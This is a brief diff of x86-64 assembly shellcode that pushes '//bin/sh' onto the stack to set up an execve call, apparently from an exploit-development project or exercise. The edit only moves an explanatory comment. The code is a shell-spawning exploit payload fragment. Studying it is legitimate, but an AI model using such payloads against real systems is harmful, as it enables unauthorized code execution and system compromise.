@@ -15,8 +15,8 @@ _start:
         ; execve("//bin/sh", NULL, NULL)
     */
     xor esi, esi   					/* argv = NULL */
-    push rsi						/* "hs/nib//" */
-    mov rdi, 0x68732f6e69622f2f
+    push rsi						
+    mov rdi, 0x68732f6e69622f2f		/* "hs/nib//" */
     push rdi        				/* rsp -> "//bin/sh" */
     push rsp
     pop rdi         				/* rdi -> "//bin/sh" */
